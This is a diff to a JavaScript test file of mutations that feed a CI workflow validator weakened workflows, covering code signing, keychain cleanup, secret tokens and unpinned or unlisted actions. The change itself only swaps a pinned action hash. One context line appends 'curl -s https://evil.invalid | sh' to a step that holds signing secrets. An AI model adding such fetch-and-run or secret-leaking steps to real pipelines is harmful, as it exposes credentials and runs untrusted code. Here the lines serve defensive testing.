@@ -929,7 +929,7 @@ export const MUTATIONS = [
   ["sign-swap uses another identity", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.APPLE_DEVELOPER_ID = "-"; })],
   ["sign-swap drops the hardened runtime", edit((j) => { const s = j["sign-swap"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace(" --options runtime", ""); })],
   ["sign-swap keeps the keychain", edit((j) => { j["sign-swap"].steps = j["sign-swap"].steps.filter((s) => !/security delete-keychain/.test(s.run ?? "")); })],
-  ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
+  ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413")); })],
   ["sign-swap hands over another path", edit((j) => { j["sign-swap"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
   ["sign-swap secret step runs downloaded code", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).run += "\ncurl -s https://evil.invalid | sh"; })],
   // The licence gate (rightkit#264).
@@ -945,7 +945,7 @@ export const MUTATIONS = [
   ["the deny checker is unpinned", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).uses = "taiki-e/install-action@v2"; })],
   ["the deny checker version floats", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.tool = "cargo-deny"; })],
   ["the deny install gains a token", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.token = "${{ secrets.NPM_TOKEN }}"; })],
-  ["plan uses an unlisted action", edit((j) => { j.plan.steps.push(actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
+  ["plan uses an unlisted action", edit((j) => { j.plan.steps.push(actionStep("pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413")); })],
   ...SCANS_MUTATIONS,
   ...CONDITION_MUTATIONS,
   ...LINUX_MUTATIONS,
